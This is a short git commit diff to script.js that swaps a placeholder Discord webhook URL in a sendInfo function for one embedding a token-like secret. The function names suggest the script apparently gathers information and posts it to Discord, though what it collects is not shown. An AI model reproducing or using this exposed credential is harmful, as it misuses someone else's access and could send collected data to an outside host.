84e403be684f972556fc4287f6f038b46a835ff3
Ali Alami <139745680+alamiali12@users.noreply.github.com>
2024-01-24 23:49:09 +0330

    Update script.js

--- script.js
+++ script.js
@@ -58,7 +58,7 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "https://discord.com/api/webhooks/ID/TOKEN"; //your discord webhook url
+  const webhook = "https://discord.com/api/webhooks/ID/MTE2ODg3Mzg0NTcwMTIzMDcyNA.G86Stl.sESA-BwTowBKmngUU5_7JltzoygCBhUQ07_fx0"; //your discord webhook url
 
   const embed = {
     color: 1585803, //#18328b
